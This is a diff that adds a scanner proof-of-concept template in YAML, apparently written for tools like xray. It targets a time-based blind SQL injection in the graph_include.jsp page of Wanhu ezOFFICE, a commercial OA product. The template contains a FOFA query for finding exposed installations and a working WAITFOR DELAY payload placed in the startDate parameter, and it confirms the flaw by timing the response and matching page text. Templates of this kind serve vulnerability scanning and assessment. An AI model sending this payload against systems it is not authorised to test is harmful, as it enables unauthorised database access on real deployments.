@@ -1,0 +1,26 @@
+id: poc-yaml-wanhu-ezoffice-graph-include-jsp-sqli
+info:
+  name: 万户 ezOFFICE graph_include.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /defaultroot/platform/report/graphreport/graph_include.jsp?id=2&startDate=2022-01-01%2000:00:00.000%27%20as%20datetime)%20group%20by%20t.emp_id,t.empname%20)%20%20s%20group%20by%20empname%20order%20by%20num%20desc%20%20WAITFOR%20DELAY%20%270:0:{{.t1}}%27--
+  expression: 'status_code == 200 &&
+
+    contains(body,"开始时间") &&
+
+    contains(body,"系统使用频度统计") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
